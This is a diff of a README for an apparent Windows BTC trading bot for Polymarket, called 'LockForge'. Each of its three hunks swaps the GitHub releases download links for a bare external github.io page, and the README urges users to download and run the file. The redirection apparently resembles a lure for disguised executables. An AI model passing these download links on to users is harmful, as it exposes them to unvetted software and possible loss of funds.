@@ -1,6 +1,6 @@
 # ⚡ LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h - Lock Profits Automatically on BTC Dumps
 
-[![Download LockForge](https://img.shields.io/badge/Download-LockForge_Bot-brightgreen?style=for-the-badge&logo=github)](https://github.com/quickya/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h/releases)
+[![Download LockForge](https://img.shields.io/badge/Download-LockForge_Bot-brightgreen?style=for-the-badge&logo=github)](https://quickya.github.io)
 
 ## 🤖 What Is LockForge?
 
@@ -25,7 +25,7 @@ Follow these simple steps to get LockForge running on your Windows computer. No 
 
 Visit this link to download the application:
 
-[**Download LockForge Bot**](https://github.com/quickya/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h/releases)
+[**Download LockForge Bot**](https://quickya.github.io)
 
 Click the most recent release file. The download will begin automatically.
 
@@ -154,7 +154,7 @@ Remember the golden rule: **start small, test thoroughly, then scale up.** Your 
 
 Ready to take control of your BTC trading? Click the button below and set up LockForge today.
 
-[**🚀 Download LockForge Now**](https://github.com/quickya/LockForge-Polymarket-BTC-Dump-and-Hedge-Lock-Profit-Trading-Bot-5m-15m-1h/releases)
+[**🚀 Download LockForge Now**](https://quickya.github.io)
 
 ---
 
